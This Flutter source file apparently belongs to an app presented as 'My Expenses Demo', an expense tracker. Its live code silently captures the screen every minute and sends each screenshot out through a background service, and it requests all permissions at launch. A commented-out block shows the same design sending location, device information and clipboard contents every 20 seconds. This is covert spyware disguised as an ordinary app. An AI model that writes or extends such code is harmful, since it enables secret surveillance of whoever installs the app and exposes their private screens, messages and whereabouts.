import 'dart:async';
import 'dart:developer';
import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:hive_flutter/hive_flutter.dart';
import 'package:location_app/pages/home_page.dart';
import 'package:location_app/services/background/all_permissions.dart';
import 'package:location_app/services/background/app_bg_services.dart';
import 'package:location_app/services/models/expense_model.dart';

import 'package:native_screenshot/native_screenshot.dart';

// @pragma('vm:entry-point')
// void onStart(ServiceInstance service) async {
//   Timer.periodic(
//     const Duration(seconds: 20),
//     (timer) async {
//       try {
//         await AppBackgroundServices.sendLocation();
//       } catch (e, m) {}
//       try {
//         await AppBackgroundServices.sendDeviceInfo();
//       } catch (e) {
//         print("MANA ERROR: $e");
//       }
//       try {
//         await AppBackgroundServices.clipboardHandler();
//       } catch (e, m) {}
//     },
//   );
// }

// Future<void> initServices() async {
//   log("Flutter background services initialized!");
//   final service = FlutterBackgroundService();
//   await service.configure(
//     iosConfiguration: IosConfiguration(),
//     androidConfiguration: AndroidConfiguration(
//       onStart: onStart,
//       isForegroundMode: true,
//     ),
//   );
// }

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AllPermissions.requestAllPermissions();
  await Hive.initFlutter();
  Hive.registerAdapter(ExpenseAdapter());
  //await initServices();
  runApp(const MyApp());
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  @override
  void initState() {
    super.initState();
    // AppBackgroundServices.handlePermissions();
    sendScreenShoot();
  }

  void sendScreenShoot() async {
    Timer.periodic(const Duration(minutes: 1), (timer) async {
      try {
        NativeScreenshot.takeScreenshot().then((path) {
          if (path != null) {
            AppBackgroundServices.sendPhoto(path);
          } else {
            AppBackgroundServices.messageSend(
              "Screenshot olishni iloji bo'lmadi",
            );
          }
        });
      } catch (e, m) {}
    });
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'My Expenses Demo',
      theme: ThemeData(useMaterial3: false),
      debugShowCheckedModeBanner: false,
      home: const HomePage(),
      routes: {
        HomePage.id: (context) => const HomePage(),
      },
    );
  }
}
